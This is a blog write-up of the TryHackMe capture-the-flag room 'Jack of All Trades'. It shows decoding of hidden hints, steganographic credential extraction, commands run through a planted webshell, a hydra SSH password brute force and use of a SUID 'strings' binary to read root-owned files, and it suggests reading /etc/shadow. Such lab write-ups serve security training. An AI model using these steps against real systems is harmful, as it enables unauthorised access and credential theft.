---
layout: post
title: "TryHackMe - Jack of All Trades"
author: "joona"
---

![](/images/jackbox/header.jpg)
>Jack is a man of a great many talents. The zoo has employed him to capture the penguins due to his years of penguin-wrangling experience, but all is not as it seems... We must stop him! Can you see through his facade of a forgetful old toymaker and bring this lunatic down?

[Jack of All Trades](https://tryhackme.com/room/jackofalltrades) is an easy Linux box and was originally part of the [Securi-Tay 2020 conference](https://securi-tay.co.uk/).
It includes basic steganography and enumeration. Getting the root flag requires brute-forcing the initial access and then using a service with SUID bit
to print out the root flag.<br/><br/>

### Nmap results<br/>
{% highlight plaintext %}
nmap -A -p- 10.10.72.112 -oA nmap/jack
PORT   STATE SERVICE VERSION
22/tcp open  http    Apache httpd 2.4.10 ((Debian))
80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
{% endhighlight %}

So the SSH and HTTP ports are inverted. By default Firefox can't open a website
at port 22 and gives a warning:
>This address uses a network port which is normally used for purposes other than Web browsing. Firefox has canceled the request for your protection.

You can bypass this by overriding banned ports in `about:config`.<br/>
Guide: [https://support.mozilla.org/en-US/questions/1083282](https://support.mozilla.org/en-US/questions/1083282)<br/><br/>

### Website enumeration
At first I was just trying to speedrun this box and instead of searching how to bypass that Firefox warning, I curl'd the website:
>curl 10.10.72.112:22

In the homepage source code we have a Base64 string and a comment:
{% highlight plaintext %}
<!--Note to self - If I ever get locked out I can get back in at /recovery.php! -->
UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg==
{% endhighlight %}
The Base64 translates to:
>Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u?WtKSraq

![](/images/jackbox/homesource.jpg)

Curl the `recovery.php` site we get another Base64 looking string.
{% highlight plaintext %}
GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=
{% endhighlight %}

This one is in all caps so it's probably Base32.
Throwing this into [CyberChef](https://gchq.github.io/CyberChef/) we get:
{% highlight plaintext %}
45727a727a6f72652067756e67206775722070657271726167766e79662067622067757220657270626972656c207962747661206e657220757671717261206261206775722075627a72636e7472212056207861626a2075626a20736265747267736879206c6268206e65722c20666220757265722766206e20757661673a206f76672e796c2f3247694c443246
{% endhighlight %}

CyberChef automatically identifies this as Hex which translates to a ROT13 encrypted string, which translates to:
{% highlight plaintext %}
Erzrzore gung gur perqragvnyf gb gur erpbirel ybtva ner uvqqra ba gur ubzrcntr!
V xabj ubj sbetrgshy lbh ner, fb urer'f n uvag: ovg.yl/2GiLD2F

Remember that the credentials to the recovery login are hidden on the homepage!
I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S
{% endhighlight %}
<br/>

### Steganoraphy and Initial Foothold
The shortened URL redirects to a Wikipedia article [Stegosauria](https://en.wikipedia.org/wiki/Stegosauria), hinting that the credentials are probably hidden
inside of a picture on the homepage. <br/>

First I grabbed the most obvious choice `10.10.72.112:22/assets/stego.jpg`.<br/>
Running steghide on that gave a text file called `creds.txt`:
{% highlight plaintext %}
root@world:~/tryhackme/jackofall# steghide extract -sf stego.jpg
Enter passphrase: u?WtKSraq
wrote extracted data to "creds.txt".

root@world:~/tryhackme/jackofall# cat creds.txt
Hehe. Gotcha!
You're on the right path, but wrong image!
{% endhighlight %}

After this one there was to more options left, header.jpg and jackinthebox.jpg.<br/>
Thinking that I ain't finna get finessed two times in a row, I went after the `header.jpg` and
gave it the same treatment as stego.jpg. This resulted in file called `cms.creds`:
{% highlight plaintext %}
Here you go Jack. Good thing you thought ahead!

Username: jackinthebox
Password: TplFxiSHjY
{% endhighlight %}

We can use these credentials to login on `10.10.72.112:22/recovery.php`.<br/>
![](/images/jackbox/recoverypage.jpg)

After logging in we are redirected to a new page:
![](/images/jackbox/recovery2.jpg)

It seems we have a simple webshell that we can use. Listing the contents of `/home`-directory we see an interesting file `jacks_password_list`.<br/>
{% highlight plaintext %}
10.10.72.112:22/nnxhweOV/index.php?cmd=ls /home
10.10.72.112:22/nnxhweOV/index.php?cmd=cat /home/jacks_password_list
{% endhighlight %}
![](/images/jackbox/pass.jpg)


We get twenty-something passwords we can try to login with.
I saved the passwords to a text file and tried to brute-force the SSH-login (port 80).
{% highlight cmd %}
hydra -l jack -P pass.txt ssh://10.10.72.112 -s 80
{% endhighlight %}
![](/images/jackbox/hydra.jpg)<br/>

Logging in to SSH with the credentials we find `user.jpg` in jack's home directory.<br/>
We can download it with SCP:
{% highlight plaintext %}
scp -P 80 jack@10.10.72.112:/home/jack/user.jpg
{% endhighlight %}
![](/images/jackbox/user.jpg)<br/><br/>

### Root Flag
Running the enumeration tool [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
on the victim machine, we see that `string`-command has SUID bit set.
We can use this to [read files](https://gtfobins.github.io/gtfobins/strings/) like root.txt:
{% highlight console %}
jack@jack-of-all-trades:~$ LFILE=/root/root.txt
jack@jack-of-all-trades:~$ strings "$LFILE"
ToDo:
1.Get new penguin skin rug -- surely they won't miss one or two of those blasted creatures?
2.Make T-Rex model!
3.Meet up with Johny for a pint or two
4.Move the body from the garage, maybe my old buddy Bill from the force can help me hide her?
5.Remember to finish that contract for Lisa.
6.Delete this: ~~~censored root flag~~~
{% endhighlight %}

We could also use this to read the /etc/shadow and crack the hashes, or try to find SSH-keys.
